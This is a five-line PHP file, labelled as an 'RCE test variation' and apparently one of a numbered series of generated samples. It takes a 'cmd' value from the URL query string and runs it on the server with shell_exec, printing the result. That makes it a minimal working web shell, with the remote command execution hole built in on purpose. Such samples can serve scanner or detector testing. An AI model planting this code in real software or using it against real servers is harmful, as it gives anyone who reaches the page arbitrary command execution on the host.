<?php
// RCE test variation #787
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>